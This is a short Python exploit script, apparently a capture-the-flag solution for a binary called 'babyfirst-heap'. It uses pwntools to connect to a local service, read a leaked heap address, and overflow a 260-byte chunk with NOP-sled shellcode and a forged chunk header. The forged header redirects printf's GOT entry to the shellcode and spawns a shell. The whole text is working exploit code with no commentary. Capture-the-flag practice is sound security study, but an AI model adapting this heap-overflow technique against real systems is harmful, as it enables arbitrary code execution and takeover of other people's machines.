from pwn import *
import re
#context.log_level = 'debug' 
elf = ELF('babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c')

#io = process('./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c')
io = remote ('127.0.0.1', 9998)
output = io.recv(1024)
#output = io.recv(1024)


s = re.search ("\[ALLOC\]\[loc=[a-z,A-z,0-9]+\[size=260\]", output)
sc_addr = int(s.group()[12:19],16)
nop = "\x90" * 30
shellcode = nop + asm(shellcraft.i386.sh())

payload = '\xeb\x0c' # jmp_patch
payload += shellcode
payload += "A"* (260 - len(payload))
payload += p32(0x1) # make the next chunk free
payload += p32(elf.got['printf'] - 8)
payload += p32(sc_addr)

io.sendline (payload)
io.interactive()